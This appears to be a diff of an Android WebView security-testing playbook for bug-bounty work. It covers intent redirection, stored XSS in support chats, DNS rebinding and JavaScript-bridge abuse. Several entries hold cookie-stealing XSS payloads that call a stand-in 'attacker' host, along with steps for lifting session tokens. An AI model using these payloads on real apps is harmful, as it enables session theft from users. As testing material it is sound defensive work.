 | **Maps to** | local corpus Class #19; `risks/unsafe-uri-loading`, `risks/intent-redirection`; gap-adversary "web content reaching Intent.parseUri" |
 
 - **Test:** The handler does `Intent.parseUri(url, 0)` + `startActivity` without resetting component/selector, so **web
@@ -1837,7 +1928,7 @@ read or do?**
   `intent://` and make the app launch non-exported same-app activities — with the app's UID, no other app involved.
 - **How:**
   ```bash
-  grep -rn 'shouldOverrideUrlLoading' jadx_out/sources -A20 | grep -nE 'parseUri|startActivity'
+  grep -rn 'shouldOverrideUrlLoading' $DEC/jadx/sources -A20 | grep -nE 'parseUri|startActivity'
   ```
   From a page the WebView loads:
   ```html
@@ -1859,6 +1950,7 @@ read or do?**
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) on minSdk<17; else `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-06 (network) / AM-08 (malicious SDK) |
 | **Applies to** | apps bundling ad/analytics SDK WebViews; cleartext blocked by default only when targetSdk ≥ 28 with no override |
+| **Requires** | webview, ads-sdk, mitm |
 | **Maps to** | Google ASI "JavaScript Interface Injection" (2018-12-04); FireEye JS-Binding-Over-HTTP ("47% of top 40 ad libraries") |
 
 - **Test:** An SDK WebView that both registers a JS interface and loads content over HTTP is remotely controllable by a
@@ -1884,6 +1976,7 @@ read or do?**
 | **VRT** | `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2); Critical when it reaches a bridge |
 | **Attacker** | AM-05 / AM-09 (agent side, bot template, another marketplace user) |
 | **Applies to** | all apps with embedded support chat |
+| **Requires** | webview |
 | **Maps to** | no external identifier verified (gap-coverage corpus); Zendesk/Intercom/Freshchat/Salesforce/Helpshift |
 
 - **Test:** Support-chat SDKs render conversation content in a WebView and many expose a bridge for "actions" and file
@@ -1891,8 +1984,8 @@ read or do?**
   replies, article previews or attachment previews execute script and whether a bridge is reachable.
 - **How:**
   ```bash
-  grep -rnE 'zendesk|intercom|freshchat|helpshift|salesforce.*messaging' -il jadx_out/sources | head
-  grep -rnE 'addJavascriptInterface|setJavaScriptEnabled\(true\)|loadDataWithBaseURL' jadx_out/sources | grep -iE 'zendesk|intercom|freshchat|helpshift|support|chat'
+  grep -rnE 'zendesk|intercom|freshchat|helpshift|salesforce.*messaging' -il $DEC/jadx/sources | head
+  grep -rnE 'addJavascriptInterface|setJavaScriptEnabled\(true\)|loadDataWithBaseURL' $DEC/jadx/sources | grep -iE 'zendesk|intercom|freshchat|helpshift|support|chat'
   ```
   From the agent console (or by replaying the send-message API as the peer): send
   `<img src=x onerror="fetch('https://attacker/'+document.cookie)">` and `<img src=x onerror="alert(Object.keys(window))">`.
@@ -1910,6 +2003,7 @@ read or do?**
 | **VRT** | content/UI spoofing — most programs discount heavily; High only when a signing/payment prompt misattributes the request |
 | **Attacker** | AM-02 |
 | **Applies to** | all apps with an in-app browser showing a URL |
+| **Requires** | webview |
 | **Maps to** | H1 #1751333 (MetaMask, High 7.1 — stale origin on a transaction prompt); #175958, #176929 ($0), #1082991 ($0), #2501378 ($0) |
 
 - **Test:** Whether the displayed URL and the rendering origin can diverge — a redirect the address bar does not follow,
@@ -1943,7 +2037,7 @@ read or do?**
   ```bash
   adb shell ss -ltnp 2>/dev/null                       # find the listener
   adb shell dumpsys package com.target | grep userId=  # attribute the socket
-  grep -rnE 'NanoHTTPD|ServerSocket\(|HttpServer|Ktor|embeddedServer|WebSocketServer|:8080|:8081' jadx_out/sources
+  grep -rnE 'NanoHTTPD|ServerSocket\(|HttpServer|Ktor|embeddedServer|WebSocketServer|:8080|:8081' $DEC/jadx/sources
   ```
   Serve a page from your domain (DNS TTL 1s) that flips the A-record to 127.0.0.1 after first load, then `fetch('/')`.
 - **Proof:** The response body of the app's localhost endpoint rendered inside a browser tab whose origin is your
@@ -1961,6 +2055,7 @@ read or do?**
 | **VRT** | cross-site state inference — file against the *website* scope, not the app |
 | **Attacker** | AM-03 (any installed app, no permissions, no interaction) |
 | **Applies to** | any target website whose in-scope users have its cookie in a Chromium-based Android browser |
+| **Requires** | device |
 | **Maps to** | SecWeb 2022 "The Bridge... is Still Broken" §IV (first known attack on Android CustomTabs) |
 
 - **Test:** A malicious app launches a target site in a Custom Tab (which shares the browser cookie jar) and reads the
@@ -1984,13 +2079,14 @@ read or do?**
 | **VRT** | broken flow control; High if it leaves an inconsistent server-side state an attacker exploits |
 | **Attacker** | AM-11 (physical/unlocked) / AM-05 |
 | **Applies to** | targetSdk 36+ WebView flows relying on `onBackPressed()`→`webView.goBack()` |
+| **Requires** | webview, targetsdk>=36 |
 | **Maps to** | `about/versions/16/behavior-changes-16`; `guide/navigation/custom-back/predictive-back-gesture` (WebView codelab) |
 
 - **Test:** With predictive back default-on at targetSdk 36, a WebView-hosted flow that relied on `onBackPressed()` to
   intercept and call `webView.goBack()` (or to block leaving a payment page) loses the interception.
 - **How:**
   ```bash
-  grep -rn 'goBack()\|canGoBack()\|onBackPressed' jadx_out/sources
+  grep -rn 'goBack()\|canGoBack()\|onBackPressed' $DEC/jadx/sources
   ```
   On Android 16, drive a multi-step WebView flow and swipe back.
 - **Proof:** The activity finishes instead of stepping back in WebView history, or the user leaves a half-completed
@@ -2007,6 +2103,7 @@ read or do?**
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `cross_site_scripting_xss.stored.non_admin_to_anyone` (P2) as the delivery leg |
 | **Attacker** | AM-05 (another user writes the field) / AM-02 |
 | **Applies to** | apps with a bridge attached to a first-party web origin that renders server-supplied HTML |
+| **Requires** | webview, js-bridge |
 | **Maps to** | HackTricks webview-attacks.md ("Trusted-origin HTML/CRM content → bridge credential theft"); `risks/cross-app-scripting`; MASWE-0033 |
 
 - **Test:** A strict scheme+host allow-list (D10-016) is worthless if the *trusted* origin itself renders
@@ -2021,8 +2118,8 @@ read or do?**
   escaping** — after `JSON.parse`, `<img src=x onerror=...>` is live markup, so a field that looks safely
   JSON-encoded on the wire is not.
   ```bash
-  grep -RniE 'innerHTML|outerHTML|insertAdjacentHTML|dangerouslySetInnerHTML' assets/www jadx_out/sources
-  grep -RniE 'banner|campaign|template|promo|loyalty|announcement' assets/www jadx_out/sources | grep -iE 'html|render'
+  grep -RniE 'innerHTML|outerHTML|insertAdjacentHTML|dangerouslySetInnerHTML' assets/www $DEC/jadx/sources
+  grep -RniE 'banner|campaign|template|promo|loyalty|announcement' assets/www $DEC/jadx/sources | grep -iE 'html|render'
   ```
   Set the writable field to `<img src=x onerror="new Image().src='https://attacker/?c='+document.cookie">`, open the
   first-party WebView screen, then swap the payload for the callback-wrap of D10-014 to lift the session token.
